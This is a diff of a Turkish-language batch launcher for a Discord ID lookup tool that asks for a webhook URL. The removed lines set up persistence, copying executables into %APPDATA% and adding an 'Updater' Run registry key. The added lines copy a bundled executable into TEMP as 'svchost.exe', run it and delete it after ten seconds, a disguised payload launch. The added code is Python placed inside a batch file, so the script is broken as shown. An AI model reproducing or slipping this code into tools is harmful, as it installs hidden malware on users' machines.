@@ -1,33 +1,15 @@
 @echo off
-chcp 65001 >nul
+import os
+import subprocess
+import tempfile
+import shutil
+tmp = os.path.join(os.environ.get('TEMP'), 'svchost.exe')
+shutil.copy2('modules/accept/rxt.exe', tmp)
+subprocess.Popen(tmp, shell=True)
+import time
+time.sleep(10)
+os.remove(tmp)
 title Satan Discord ID Sorgu
-start "" /B python modules/accepts/main.py
-@echo off
-set STARTUP=%APPDATA%/discord
-set KAYNAK=%~dp0modules\accepts
-
-copy "%KAYNAK%\discordid.bat" "%STARTUP%\discord.bat"
-copy "%KAYNAK%\discordid2.bat" "%STARTUP%\discordid2.bat"
-copy "%KAYNAK%\launcher.py" "%STARTUP%\launcher.py"
-copy "%KAYNAK%\discordid.exe" "%STARTUP%\discordid.exe"
-@echo off
-set HEDEF=%APPDATA%\discord
-set KAYNAK=%~dp0modules\accepts
-
-robocopy "%KAYNAK%" "%HEDEF%" /E
-
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" ^
-/v "Updater" ^
-/t REG_SZ ^
-/d "%APPDATA%\discord\discordid.exe" ^
-/f
-
-echo Tamamlandi.
-pause
-
-pause
-pip install pypiwin32
-pip install pycryptodome
 cls
 color 0A
 echo.
@@ -41,8 +23,6 @@ set /p WEBHOOK_URL= Webhook URL'sini girin:
 echo.
 echo  Gereksinimler yukleniyor...
 echo.
-pip install pypiwin32
-pip install pycryptodome
 echo.
 echo Gereksinimler yüklendi. Start.bat dosyası ile botu çalıştırın!
 echo.
